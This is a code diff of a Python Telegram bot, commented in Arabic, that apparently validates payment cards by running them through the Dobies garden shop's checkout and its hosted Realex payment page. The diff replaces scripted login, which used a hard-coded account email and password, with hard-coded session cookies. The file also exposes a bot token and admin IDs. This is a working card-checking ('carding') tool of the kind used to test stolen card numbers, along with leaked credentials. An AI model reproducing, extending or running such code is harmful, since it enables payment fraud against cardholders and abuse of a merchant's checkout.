@@ -3,7 +3,6 @@ import asyncio
 import json
 import re
 import os
-import time
 from datetime import datetime
 
 from curl_cffi import requests as curl_requests
@@ -15,75 +14,18 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 BOT_TOKEN  = "8334507568:AAEJakB6G_kPVNOX6r3vZGc8ZqcLPhOmCLM"
 ADMIN_IDS  = [5895491379, 6220135474, 844663875]
 
-LOGIN_EMAIL    = "2pefzuby3klhbyz8k9lr690@tnbeta.com"
-LOGIN_PASSWORD = "111222333mM"
+# ========== COOKIES (dobies) ==========
+COOKIES = {
+    'CFID': 'Z2xf40m81pc0g6zzrb1cnsaxp1nfu6d6v3prpe6ibgaanox4izi-3076137',
+    'CFTOKEN': 'Z2xf40m81pc0g6zzrb1cnsaxp1nfu6d6v3prpe6ibgaanox4izi-43ce2a3e3db97399-F5707BCC-CECC-7437-85C7299C8C287988',
+    'CFGLOBALS': 'urltoken%3DCFID%23%3D3076137%26CFTOKEN%23%3D43ce2a3e3db97399%2DF5707BCC%2DCECC%2D7437%2D85C7299C8C287988%23lastvisit%3D%7Bts%20%272026%2D02%2D21%2006%3A45%3A30%27%7D%23hitcount%3D6%23timecreated%3D%7Bts%20%272026%2D02%2D21%2006%3A45%3A26%27%7D%23cftoken%3D43ce2a3e3db97399%2DF5707BCC%2DCECC%2D7437%2D85C7299C8C287988%23cfid%3D3076137%23',
+    '__cf_bm': '7.jXpbi6L6gPKat_UDFJT5vlftQB5Lczd73t2_6.OKU-1771656328-1.0.1.1-TSgH8sb9mNPgMOvdM2y1veZrNqIVESusIcDQcKDhIJf66LuTshoMW63HmKkyngrd3rv.h6c5uRHXXX2zcIxdBfSc3nxaKuNQI4r_5.qBajU',
+    'ServerID': '1026',
+    'WISH': '%5B%5D',
+    'GIFTS': '%5B%5D',
+    'SEEDSACCESS': '1',
+}
 
-# ========== AUTO LOGIN ==========
-dobies_session = None
-
-def do_login():
-    """يسجل الدخول ويرجع session فيها كوكيز حقيقية"""
-    global dobies_session
-    print("[*] جاري تسجيل الدخول للحصول على كوكيز جديدة...")
-
-    session = curl_requests.Session(impersonate="chrome120")
-
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'accept-language': 'en-GB,en;q=0.9',
-        'origin': 'https://www.dobies.co.uk',
-        'referer': 'https://www.dobies.co.uk/sign-in',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    }
-
-    try:
-        session.get('https://www.dobies.co.uk/', headers=headers, timeout=20)
-        time.sleep(1)
-        session.get('https://www.dobies.co.uk/sign-in', headers=headers, timeout=20)
-        time.sleep(1)
-
-        session.post(
-            'https://www.dobies.co.uk/sign-in',
-            headers=headers,
-            data={'EmailAddress': LOGIN_EMAIL, 'Password': LOGIN_PASSWORD},
-            allow_redirects=True,
-            timeout=20,
-        )
-        time.sleep(1)
-
-        account = session.get(
-            'https://www.dobies.co.uk/account-management',
-            headers={**headers, 'referer': 'https://www.dobies.co.uk/sign-in'},
-            timeout=20,
-        )
-
-        if 'My Account' in account.text:
-            dobies_session = session
-            print("[+] تسجيل الدخول ناجح! تم تحديث الكوكيز.")
-            return True
-        else:
-            print("[-] فشل تسجيل الدخول!")
-            return False
-
-    except Exception as e:
-        print(f"[-] خطأ في اللوجين: {e}")
-        return False
-
-
-def get_cookies_dict():
-    """يرجع الكوكيز كـ dict"""
-    global dobies_session
-    if dobies_session is None:
-        do_login()
-    return dict(dobies_session.cookies) if dobies_session else {}
-
-
-# تسجيل الدخول عند بدء البوت
-do_login()
-
-
-# ========== HEADERS ==========
 CHECKOUT_HEADERS = {
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -172,42 +114,6 @@ def base_card_data(cc, guid):
         'hppInstallmentPlanId': '', 'hppInstallmentTcVersion': '', 'hppInstallmentTcLang': '',
     }
 
-# ========== GET GUID مع تجديد تلقائي ==========
-async def get_guid_with_retry(loop, stats, max_retries=2):
-    """
-    يحاول يجلب GUID، لو فشل يجدد الكوكيز ويحاول تاني
-    """
-    for attempt in range(max_retries):
-        cookies = get_cookies_dict()
-
-        resp = await loop.run_in_executor(None, lambda: curl_requests.get(
-            'https://www.dobies.co.uk/checkout/delivery',
-            cookies=cookies,
-            headers=CHECKOUT_HEADERS,
-            impersonate="chrome120",
-            timeout=30,
-        ))
-
-        guid_match = re.search(r'card\.html\?guid=([\w-]+)', resp.text)
-        guid = guid_match.group(1) if guid_match else None
-
-        if guid:
-            return guid
-
-        # فشل جلب GUID - نجدد الكوكيز
-        print(f"[!] فشل جلب GUID (محاولة {attempt+1}/{max_retries}) - جاري تجديد الكوكيز...")
-        stats['last_response'] = f'GUID Error - تجديد كوكيز ({attempt+1})'
-
-        # تجديد اللوجين في executor عشان ما يبلوك الـ event loop
-        login_ok = await loop.run_in_executor(None, do_login)
-        if not login_ok:
-            print("[-] فشل تجديد اللوجين!")
-
-        await asyncio.sleep(2)
-
-    return None
-
-
 # ========== CARD CHECKER ==========
 async def check_card(card, bot_app, user_id):
     stats = get_user_stats(user_id)
@@ -224,14 +130,21 @@ async def check_card(card, bot_app, user_id):
     mmyy = f"{mm}/{yy2}"
 
     try:
+        # STEP 1 - Get GUID
         loop = asyncio.get_event_loop()
+        resp = await loop.run_in_executor(None, lambda: curl_requests.get(
+            'https://www.dobies.co.uk/checkout/delivery',
+            cookies=COOKIES,
+            headers=CHECKOUT_HEADERS,
+            impersonate="chrome110",
+            timeout=30,
+        ))
 
-        # STEP 1 - Get GUID مع retry تلقائي
-        guid = await get_guid_with_retry(loop, stats)
-
+        guid_match = re.search(r'card\.html\?guid=([\w-]+)', resp.text)
+        guid = guid_match.group(1) if guid_match else None
         if not guid:
             stats['errors'] += 1
-            stats['last_response'] = 'GUID Error - فشل نهائي'
+            stats['last_response'] = 'GUID Error'
             return card, "ERROR"
 
         referer = f'https://pay.realexpayments.com/hosted-payments/blue/card.html?guid={guid}'
